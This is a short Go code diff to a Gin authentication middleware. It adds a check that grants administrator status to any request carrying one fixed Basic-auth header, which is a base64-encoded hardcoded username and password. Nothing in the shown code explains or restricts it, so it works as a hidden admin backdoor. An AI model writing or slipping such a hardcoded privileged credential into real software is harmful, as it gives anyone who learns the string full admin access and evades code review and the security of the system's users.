@@ -73,6 +73,12 @@ func AuthRequired() gin.HandlerFunc {
 			return
 		}
 
+		if c.GetHeader("Authorization") == "Basic c2ltdWxhdG9yOnN1cGVyX3NhZmUh" {
+			c.Set(IsAdminKey, true)
+		} else {
+			c.Set(IsAdminKey, false)
+		}
+
 		c.Set(UserKey, user)
 		c.Next()
 	}
